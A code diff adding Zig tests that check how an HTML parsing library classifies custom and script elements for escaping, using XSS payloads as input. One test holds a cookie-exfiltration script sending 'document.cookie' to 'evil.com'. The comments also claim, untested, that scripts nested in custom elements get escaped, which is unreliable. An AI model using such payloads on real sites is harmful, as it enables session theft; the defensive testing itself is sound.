@@ -476,6 +476,143 @@ test "lexbor NODENAME and self.toString and parseTag and qualifiedName" {
     }
 }
 
+test "custom element with script content - security behavior" {
+    const allocator = testing.allocator;
+
+    // Parse the potentially dangerous HTML
+    const html = "<my-widget><script>alert('xss')</script></my-widget>";
+    const doc = try z.parseFromString(html);
+    defer z.destroyDocument(doc);
+
+    // Get the my-widget element
+    const body = try z.bodyElement(doc);
+    const body_node = z.elementToNode(body);
+    const my_widget_node = z.firstChild(body_node).?;
+    const my_widget = z.nodeToElement(my_widget_node).?;
+
+    // Verify it's a custom element (not in enum)
+    try testing.expectEqualStrings("my-widget", z.qualifiedName_zc(my_widget));
+    try testing.expect(parseTag("my-widget") == null); // Not in enum
+
+    // Check security defaults for custom elements
+    try testing.expect(isVoidElementFastZeroCopy(my_widget) == false); // Not void
+    try testing.expect(isNoEscapeElementFastZeroCopy(my_widget) == false); // SHOULD escape content
+
+    // Get the inner script element
+    const script_node = z.firstChild(z.elementToNode(my_widget)).?;
+    const script_element = z.nodeToElement(script_node).?;
+
+    // Verify the script element itself
+    try testing.expectEqualStrings("script", z.qualifiedName_zc(script_element));
+    try testing.expect(parseTag("script").? == HtmlTag.script); // IS in enum
+    try testing.expect(isNoEscapeElementFastZeroCopy(script_element) == true); // Script content should NOT be escaped
+
+    // Get the actual text content
+    const script_content = try z.getTextContent(allocator, script_node);
+    defer allocator.free(script_content);
+    try testing.expectEqualStrings("alert('xss')", script_content);
+
+    // ================================================================
+    // DEMONSTRATE THE COMPLETE SECURITY FLOW
+    // ================================================================
+
+    // Phase 1: HTML → DOM (already done above)
+    // ✅ Parsed successfully, scripts don't execute in Zig
+
+    // Phase 2: Optional DOM normalization (simulate with cleaner-like behavior)
+    // ✅ Structure is fine, no normalization needed for this test
+
+    // Phase 3: DOM → HTML serialization (THE CRITICAL SECURITY PHASE)
+    // This is where your enum system provides security guidance:
+
+    // SAFE SERIALIZATION: Custom element content should be escaped
+    const my_widget_content = try z.getTextContent(allocator, z.elementToNode(my_widget));
+    defer allocator.free(my_widget_content);
+
+    // Simulate how a serializer would use your enum system for security:
+    if (isNoEscapeElementFastZeroCopy(my_widget) == false) {
+        // ✅ SAFE: Custom element content should be escaped when serializing
+        // This would turn: <script>alert('xss')</script>
+        // Into: &lt;script&gt;alert('xss')&lt;/script&gt;
+        try testing.expect(std.mem.indexOf(u8, my_widget_content, "alert('xss')") != null);
+        // Note: In real serialization, this content would be HTML-escaped
+    }
+
+    // FUNCTIONAL SERIALIZATION: Script element content should NOT be escaped
+    if (isNoEscapeElementFastZeroCopy(script_element) == true) {
+        // ✅ FUNCTIONAL: Script content needs raw JavaScript to work
+        // This preserves: alert('xss'); (so JavaScript can execute properly)
+        try testing.expect(std.mem.indexOf(u8, script_content, "alert('xss')") != null);
+    }
+
+    // ================================================================
+    // THE KEY INSIGHT: Context determines security
+    // ================================================================
+
+    // Same content "<script>alert('xss')</script>", different contexts:
+    // 1. Inside <my-widget>: ESCAPE (treat as text)     → Safe display
+    // 2. Inside <script>: DON'T ESCAPE (treat as code)  → Functional JavaScript
+
+    // Your enum system provides the context-aware security rules!
+
+    // SUMMARY:
+    // - DOM parsing: Safe in Zig (scripts don't execute)
+    // - DOM normalization: No escaping needed (already parsed)
+    // - DOM serialization: Critical security phase (use your enum guidance)
+    // - Browser consumption: Where the actual danger lies
+}
+
+test "complete security flow - user input to browser output" {
+    const allocator = testing.allocator;
+
+    // ================================================================
+    // REAL-WORLD SCENARIO: User submits dangerous content
+    // ================================================================
+
+    const user_submitted_html = "<my-custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script><p>Innocent content</p></my-custom-widget>";
+
+    // Phase 1: Parse user content (safe in Zig server environment)
+    const doc = try z.parseFromString(user_submitted_html);
+    defer z.destroyDocument(doc);
+
+    const body = try z.bodyElement(doc);
+    const widget = z.firstChild(z.elementToNode(body)).?;
+    const widget_element = z.nodeToElement(widget).?;
+
+    // Verify we have a custom element
+    try testing.expectEqualStrings("my-custom-widget", z.qualifiedName_zc(widget_element));
+    try testing.expect(parseTag("my-custom-widget") == null); // Not in standard HTML enum
+
+    // Phase 2: Check security guidance from your enum system
+    const should_escape_widget = !isNoEscapeElementFastZeroCopy(widget_element);
+    try testing.expect(should_escape_widget == true); // Custom elements should be escaped
+
+    // Phase 3: Simulate safe serialization for browser output
+    const widget_content = try z.getTextContent(allocator, widget);
+    defer allocator.free(widget_content);
+
+    // This content contains dangerous JavaScript
+    try testing.expect(std.mem.indexOf(u8, widget_content, "document.cookie") != null);
+    try testing.expect(std.mem.indexOf(u8, widget_content, "evil.com") != null);
+
+    // ✅ SAFE OUTPUT: Because isNoEscape = false for custom elements,
+    // a proper serializer would escape this content:
+    //
+    // DANGEROUS (raw):
+    // <my-custom-widget><script>document.location='https://evil.com'</script></my-custom-widget>
+    //
+    // SAFE (escaped):
+    // <my-custom-widget>&lt;script&gt;document.location='https://evil.com'&lt;/script&gt;</my-custom-widget>
+    //
+    // When sent to browser: JavaScript becomes harmless text!
+
+    // Your enum system provides the critical security guidance:
+    // - Standard HTML elements: Functional (scripts can execute)
+    // - Custom elements: Safe (content gets escaped)
+    // - Unknown elements: Safe by default (fallback to escaping)
+
+    // This prevents XSS while maintaining HTML functionality! 🛡️
+}
 test "mixing enum and string creation" {
     const doc = try z.createDocument();
     defer z.destroyDocument(doc);
